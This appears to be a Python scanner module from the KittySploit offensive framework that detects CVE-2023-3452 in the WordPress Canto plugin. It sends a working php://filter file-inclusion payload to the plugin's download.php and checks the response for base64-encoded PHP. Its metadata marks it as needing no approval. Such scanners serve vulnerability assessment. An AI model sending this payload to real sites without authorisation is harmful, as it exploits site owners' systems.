#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Canto plugin for WordPress up to version 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress Canto Plugin <= 3.0.4 - File Inclusion Detection',
        'description': "Canto plugin for WordPress up to version 3.0.4 contains a remote file inclusion caused by the 'wp_abspath' parameter, letting unauthenticated attackers include and execute arbitrary remote code if allow_url_include is enabled, exploit requires allow_url_include to be enabled.",
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'wordpress', 'wp-plugin', 'canto', 'rfi', 'rce', 'unauth', 'critical'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/51826',
            'https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/canto/canto-304-unauthenticated-remote-file-inclusion',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-3452',
        ],
        'cve': 'CVE-2023-3452',
    }

    def run(self):
        path = '/wp-content/plugins/canto/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/wp-content/plugins/canto/includes/lib/download.php?wp_abspath=php://filter/convert.base64-encode/resource=/var/www/html'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('PD9waHAK', 'V29yZFByZXNz',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='WordPress Canto Plugin <= 3.0.4 - File Inclusion detected', path=path)
            return True
        return False

